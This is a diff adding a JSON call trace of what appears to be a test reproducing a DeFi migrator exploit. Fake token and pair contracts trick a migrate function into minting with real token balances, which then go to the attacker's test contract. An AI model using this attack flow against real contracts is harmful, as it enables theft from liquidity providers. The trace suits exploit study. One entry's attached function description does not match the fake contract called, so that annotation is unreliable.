+                        "return_value": "0x00000000000000000000000000000000000000000000000186a649e42e329a1a0000000000000000000000000000000000000000000000000000000000000000",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "2952",
+                            "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+                            "function": "checkFeeInRange",
+                            "value": null,
+                            "args": "150, 150",
+                            "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "2602",
+                            "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+                            "function": "7e75e3b9",
+                            "value": null,
+                            "args": "0000000000000000000000007fa10ad1414b8c455af2f802da50aab40e8af530",
+                            "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "2828",
+                            "contract": "FakeToken",
+                            "function": "balanceOf",
+                            "args": "0x7fa10ad1414b8c455Af2F802da50AAB40e8af530",
+                            "flag": 1,
+                            "return_value": "0",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "25805",
+                            "contract": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5",
+                            "function": "mintDepositCallback",
+                            "value": null,
+                            "args": "28149267765302303258 [2.814e19], 0, 0x0000000000000000000000002e234dae75c793f67a35089c9d99245e1c58470b0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f0000000000000000000000000000000000000000000000000000000000000096000000000000000000000000839b0afd0a0528ea184448e890cbaaffd99c1dbf",
+                            "return_value": "Returned",
+                            "depth": 5,
+                            "internal_calls": [
+                              {
+                                "id": "22650",
+                                "contract": "FakeToken",
+                                "function": "transferFrom",
+                                "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf, 0x7fa10ad1414b8c455Af2F802da50AAB40e8af530, 28149267765302303258 [2.814e19]",
+                                "flag": 1,
+                                "return_value": "true",
+                                "depth": 6,
+                                "internal_calls": []
+                              }
+                            ]
+                          },
+                          {
+                            "id": "828",
+                            "contract": "FakeToken",
+                            "function": "balanceOf",
+                            "args": "0x7fa10ad1414b8c455Af2F802da50AAB40e8af530",
+                            "flag": 1,
+                            "return_value": "28149267765302303258 [2.814e19]",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "id": "2165",
+                    "contract": "0x7fa10ad1414b8c455Af2F802da50AAB40e8af530",
+                    "function": "86e809fc",
+                    "value": null,
+                    "args": "",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "602",
+                        "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+                        "function": "7e75e3b9",
+                        "value": null,
+                        "args": "0000000000000000000000007fa10ad1414b8c455af2f802da50aab40e8af530",
+                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "1440",
+                    "contract": "0x7fa10ad1414b8c455Af2F802da50AAB40e8af530",
+                    "function": "liquidity",
+                    "value": null,
+                    "args": "0x36fd9efda7bb4449bb56b1960e701d87824ef201188a34972c07a06105ad3fd9",
+                    "return_value": "0x00000000000000000000000000000000000000000000000000000000000000960000000000000000000000000000000000000000000000000014f37bb9688d4f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "1226",
+                "contract": "FakeToken",
+                "function": "approve",
+                "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 0",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "23630",
+                "contract": "FakeToken",
+                "function": "transfer",
+                "args": "0x2978D920a1655abAA315BAd5Baf48A2d89792618, 3598",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "1226",
+                "contract": "FakeToken",
+                "function": "approve",
+                "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 0",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "23630",
+                "contract": "FakeToken",
+                "function": "transfer",
+                "args": "0x2978D920a1655abAA315BAd5Baf48A2d89792618, 53553740618437724760070 [5.355e22]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          },
+          {
+            "id": "531",
+            "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+            "function": "balanceOf",
+            "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf",
+            "flag": 1,
+            "return_value": "28149267765302306856 [2.814e19]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "531",
+            "contract": "0x55d398326f99059fF775485246999027B3197955",
+            "function": "balanceOf",
+            "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf",
+            "flag": 1,
+            "return_value": "53553740618437724760070 [5.355e22]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "44844",
+            "contract": "FakePair",
+            "function": "update",
+            "args": "28149267765302306856 [2.814e19], 53553740618437724760070 [5.355e22]",
+            "original_code": "    function update(\n        Liquidity.Data storage self,\n        int128 delta,\n        uint256 feeScaleX_128,\n        uint256 feeScaleY_128,\n        uint16 feeToVote,\n        uint256 fpScale_128\n    ) internal {\n        Data memory data = self;\n        uint128 liquidity;\n        feeToVote = feeToVote == 0 ? data.feeVote : feeToVote;\n        if (delta == 0) {\n            require(data.liquidity > 0, \"L>0\");\n            liquidity = data.liquidity;\n            self.feeVote = feeToVote;\n        } else {\n            liquidity = liquidityAddDelta(data.liquidity, delta);\n            uint256 feeTimesLOld = data.liquidity * data.feeVote;\n            uint256 feeTimesLNew = delta < 0 ?\n                feeTimesLOld - uint128(-delta) * feeToVote :\n                feeTimesLOld + uint128(delta) * feeToVote;\n            self.feeVote = liquidity > 0 ? uint16(feeTimesLNew / liquidity) : data.feeVote;\n        }\n        uint256 deltaScaleX = data.lastFeeScaleX_128;\n        uint256 deltaScaleY = data.lastFeeScaleY_128;\n        uint256 deltaScaleFp = data.lastFPScale_128;\n        // use assembly to prevent revert if overflow\n        // data.lastFeeScaleX(Y)_128 may be \"negative\" (>=2^255)\n        assembly {\n            deltaScaleX := sub(feeScaleX_128, deltaScaleX)\n            deltaScaleY := sub(feeScaleY_128, deltaScaleY)\n            deltaScaleFp := sub(fpScale_128, deltaScaleFp)\n        }\n        uint256 feeX = MulDivMath.mulDivFloor(deltaScaleX, data.liquidity, TwoPower.Pow128);\n        uint256 feeY = MulDivMath.mulDivFloor(deltaScaleY, data.liquidity, TwoPower.Pow128);\n        uint256 fp = MulDivMath.mulDivFloor(deltaScaleFp, data.liquidity, TwoPower.Pow128);\n        //        data.liquidity = liquidity;\n\n        // update the position\n        if (delta != 0) self.liquidity = liquidity;\n        self.lastFeeScaleX_128 = feeScaleX_128;\n        self.lastFeeScaleY_128 = feeScaleY_128;\n        self.lastFPScale_128 = fpScale_128;\n\n        //BAP-06\n        self.fpOwed += fp;\n\n        if (feeX > 0 || feeY > 0) {\n            // need to withdraw before overflow\n            self.tokenOwedX += feeX;\n            self.tokenOwedY += feeY;\n        }\n    }\n}\n",
+            "description": "1. **Core functions**:  \n   The `update` function is designed to manage and adjust liquidity-related data in a decentralized finance (DeFi) system. It handles changes in liquidity (`delta`), updates fee-related calculations, and ensures that owed tokens (both fees and other values) are accurately tracked. The function ensures that the system's state remains consistent when liquidity is added, removed, or remains unchanged.\n\n2. **Security mechanism**:  \n   - **`require` statement**: Ensures that liquidity is greater than zero when no changes (`delta == 0`) are made, preventing invalid operations.  \n   - **Assembly block**: Used to handle potential overflow issues when calculating differences in fee scales, ensuring the function doesn’t revert unexpectedly.  \n   - **Conditional checks**: Safeguards against negative liquidity changes by adjusting fee calculations accordingly.  \n   - **Internal function**: The function is marked as `internal`, restricting its access to only within the contract or derived contracts, reducing external attack vectors.  \n\n3. **Parameter Function**:  \n   - `self`: Represents the liquidity data structure being updated.  \n   - `delta`: Indicates the change in liquidity (positive for addition, negative for removal).  \n   - `feeScaleX_128` and `feeScaleY_128`: Represent the current fee scales for two tokens (X and Y) in the system.  \n   - `feeToVote`: Specifies the fee rate to be applied, defaulting to the existing fee rate if not provided.  \n   - `fpScale_128`: Represents the current scale for another financial parameter (e.g., a fee or reward).  \n\n4. **Return description**:  \n   The function does not return a value directly. Instead, it updates the `self` data structure with new values for liquidity, fee scales, and owed tokens. Specifically:  \n   - Liquidity is adjusted based on `delta`.  \n   - Fee-related values (`feeX`, `feeY`, and `fp`) are calculated using the differences in fee scales and liquidity.  \n   - Owed tokens (`tokenOwedX`, `tokenOwedY`, and `fpOwed`) are incremented based on the calculated fees.  \n\n**In summary**, the `update` function ensures that liquidity and fee-related data are accurately maintained in a DeFi system, with built-in safeguards to handle edge cases and prevent errors. It adjusts liquidity, calculates fees, and updates owed tokens while protecting against overflow and invalid operations.",
+            "return_value": "Returned",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "531",
+            "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "0",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "2531",
+            "contract": "0x55d398326f99059fF775485246999027B3197955",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "10000000000000000 [1e16]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "1752",
+            "contract": "FakePair",
+            "function": "transfer",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1000000000000000000000000000 [1e27]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "23226",
+            "contract": "FakePair",
+            "function": "approve",
+            "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf, 1000000000000000000000000000 [1e27]",
+            "flag": 1,
+            "return_value": "true",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "479312",
+            "contract": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf",
+            "function": "migrate",
+            "args": "MigrateParams({ pair: 0xF62849F9A0B5Bf2913b396098F7c7019b51A820a, liquidityToMigrate: 1094357092264218434277 [1.094e21], token0: 0x2170Ed0880ac9A755fd29B2688956BD959F933F8, token1: 0x55d398326f99059fF775485246999027B3197955, fee: 800, tickLower: 10000 [1e4], tickUpper: 20000 [2e4], amount0Min: 0, amount1Min: 0, recipient: 0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, deadline: 1688130693 [1.688e9], refundAsETH: false }",
+            "flag": 1,
+            "return_value": "28149267765302306856 [2.814e19], 8780",
+            "depth": 1,
+            "internal_calls": [
+              {
+                "id": "24650",
+                "contract": "FakePair",
+                "function": "transferFrom",
+                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], FakePair: [0xF62849F9A0B5Bf2913b396098F7c7019b51A820a], 1094357092264218434277 [1.094e21]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "972",
+                "contract": "FakePair",
+                "function": "burn",
+                "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf",
+                "flag": 1,
+                "return_value": "28149267765302306856 [2.814e19], 53553740618437724760070 [5.355e22]",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "24562",
+                "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+                "function": "approve",
+                "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 28149267765302306856 [2.814e19]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "24562",
+                "contract": "0x55d398326f99059fF775485246999027B3197955",
+                "function": "approve",
+                "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 53553740618437724760070 [5.355e22]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "350347",
+                "contract": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5",
+                "function": "mint",
+                "value": null,
+                "args": "(0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496, 0x2170Ed0880ac9A755fd29B2688956BD959F933F8, 0x55d398326f99059fF775485246999027B3197955, 800, 10000 [1e4], 20000 [2e4], 28149267765302306856 [2.814e19], 53553740618437724760070 [5.355e22], 0, 0, 1688130693 [1.688e9]",
+                "return_value": "0x00000000000000000000000000000000000000000000000000000000000005e800000000000000000000000000000000000000000000000022beec8441263cb20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b572772d8973cd445ba",
+                "depth": 2,
+                "internal_calls": [
+                  {
+                    "id": "2874",
+                    "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+                    "function": "pool",
+                    "value": null,
+                    "args": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8, 0x55d398326f99059fF775485246999027B3197955, 800",
+                    "return_value": "0x000000000000000000000000984a826f154de3b939787410bd96b68cb28d3094",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "2373",
+                    "contract": "0x984a826F154De3b939787410Bd96b68Cb28D3094",
+                    "function": "sqrtRate_96",
+                    "value": null,
+                    "args": "",
+                    "return_value": "0x0000000000000000000000000000000000000001000346d6ff11672ae55ad010",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "7136",
+                    "contract": "0x984a826F154De3b939787410Bd96b68Cb28D3094",
+                    "function": "state",
+                    "value": null,
+                    "args": "",
+                    "return_value": "0x000000000000000000000000000000000000002b9be0d1bd9d69c4053c9c2bd700000000000000000000000000000000000000000000000000000000000126f5000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002c25c19e9cd6f4676000000000000000000000000000000000000000000000000000000000000003200000000000000000000000000000000000000000000000000e208fe0d6075873000000000000000000000000000000000000000000000000077fc38f3c62d5ef",
+                    "depth": 3,
+                    "internal_calls": []
+                  },
+                  {
+                    "id": "135824",
+                    "contract": "0x984a826F154De3b939787410Bd96b68Cb28D3094",
+                    "function": "mint",
+                    "value": null,
+                    "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 10000 [1e4], 20000 [2e4], 2503698495637437618 [2.503e18], 800, 0x0000000000000000000000002170ed0880ac9a755fd29b2688956bd959f933f800000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000000000000000000320000000000000000000000000839b0afd0a0528ea184448e890cbaaffd99c1dbf",
+                    "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b572772d8973cd445ba",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "119639",
+                        "contract": "0xcbC519bBD6e48061641Ac2c332D050FC673e44a1",
+                        "function": "mint",
+                        "value": null,
+                        "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 10000 [1e4], 20000 [2e4], 2503698495637437618 [2.503e18], 800, 0x0000000000000000000000002170ed0880ac9a755fd29b2688956bd959f933f800000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000000000000000000320000000000000000000000000839b0afd0a0528ea184448e890cbaaffd99c1dbf",
+                        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000b572772d8973cd445ba",
+                        "depth": 4,
+                        "internal_calls": [
+                          {
+                            "id": "2952",
+                            "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+                            "function": "checkFeeInRange",
+                            "value": null,
+                            "args": "800, 800",
+                            "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "2602",
+                            "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+                            "function": "7e75e3b9",
+                            "value": null,
+                            "args": "000000000000000000000000984a826f154de3b939787410bd96b68cb28d3094",
+                            "return_value": "0x00000000000000000000000000000000000000000000000001bf421d2bae6f00",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "2531",
+                            "contract": "0x55d398326f99059fF775485246999027B3197955",
+                            "function": "balanceOf",
+                            "args": "0x984a826F154De3b939787410Bd96b68Cb28D3094",
+                            "flag": 1,
+                            "return_value": "95103050459862889305367 [9.51e22]",
+                            "depth": 5,
+                            "internal_calls": []
+                          },
+                          {
+                            "id": "11989",
+                            "contract": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5",
+                            "function": "mintDepositCallback",
+                            "value": null,
+                            "args": "0, 53553740618437724751290 [5.355e22], 0x0000000000000000000000002170ed0880ac9a755fd29b2688956bd959f933f800000000000000000000000055d398326f99059ff775485246999027b31979550000000000000000000000000000000000000000000000000000000000000320000000000000000000000000839b0afd0a0528ea184448e890cbaaffd99c1dbf",
+                            "return_value": "Returned",
+                            "depth": 5,
+                            "internal_calls": [
+                              {
+                                "id": "8834",
+                                "contract": "0x55d398326f99059fF775485246999027B3197955",
+                                "function": "transferFrom",
+                                "args": "0x839b0AFD0a0528ea184448E890cbaAFFD99C1dbf, 0x984a826F154De3b939787410Bd96b68Cb28D3094, 53553740618437724751290 [5.355e22]",
+                                "flag": 1,
+                                "return_value": "true",
+                                "depth": 6,
+                                "internal_calls": []
+                              }
+                            ]
+                          },
+                          {
+                            "id": "531",
+                            "contract": "0x55d398326f99059fF775485246999027B3197955",
+                            "function": "balanceOf",
+                            "args": "0x984a826F154De3b939787410Bd96b68Cb28D3094",
+                            "flag": 1,
+                            "return_value": "148656791078300614056657 [1.486e23]",
+                            "depth": 5,
+                            "internal_calls": []
+                          }
+                        ]
+                      }
+                    ]
+                  },
+                  {
+                    "id": "2176",
+                    "contract": "0x984a826F154De3b939787410Bd96b68Cb28D3094",
+                    "function": "86e809fc",
+                    "value": null,
+                    "args": "",
+                    "return_value": "Returned",
+                    "depth": 3,
+                    "internal_calls": [
+                      {
+                        "id": "602",
+                        "contract": "0x7C3d53606f9c03e7f54abdDFFc3868E1C5466863",
+                        "function": "7e75e3b9",
+                        "value": null,
+                        "args": "000000000000000000000000984a826f154de3b939787410bd96b68cb28d3094",
+                        "return_value": "0x00000000000000000000000000000000000000000000000001bf421d2bae6f00",
+                        "depth": 4,
+                        "internal_calls": []
+                      }
+                    ]
+                  },
+                  {
+                    "id": "1440",
+                    "contract": "0x984a826F154De3b939787410Bd96b68Cb28D3094",
+                    "function": "liquidity",
+                    "value": null,
+                    "args": "0x36fd9efda7bb4449bb56b1960e701d87824ef201188a34972c07a06105ad3fd9",
+                    "return_value": "0x0000000000000000000000000000000000000000000000000000000000000320000000000000000000000000000000000000000000000000263f96f374407480000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",
+                    "depth": 3,
+                    "internal_calls": []
+                  }
+                ]
+              },
+              {
+                "id": "2562",
+                "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+                "function": "approve",
+                "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 0",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "23171",
+                "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+                "function": "transfer",
+                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 28149267765302306856 [2.814e19]",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "2562",
+                "contract": "0x55d398326f99059fF775485246999027B3197955",
+                "function": "approve",
+                "args": "0x24Ba8d2A15Fe60618039c398Cf9FD093b1C1FEB5, 0",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              },
+              {
+                "id": "6071",
+                "contract": "0x55d398326f99059fF775485246999027B3197955",
+                "function": "transfer",
+                "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 8780",
+                "flag": 1,
+                "return_value": "true",
+                "depth": 2,
+                "internal_calls": []
+              }
+            ]
+          },
+          {
+            "id": "531",
+            "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "28149267765302306856 [2.814e19]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "531",
+            "contract": "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "28149267765302306856 [2.814e19]",
+            "depth": 1,
+            "internal_calls": []
+          },
+          {
+            "id": "531",
+            "contract": "0x55d398326f99059fF775485246999027B3197955",
+            "function": "balanceOf",
+            "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+            "flag": 1,
+            "return_value": "10000000000008780 [1e16]",
+            "depth": 1,
+            "internal_calls": []
+          }
+        ]
+      }
+    ]
+  }
+}
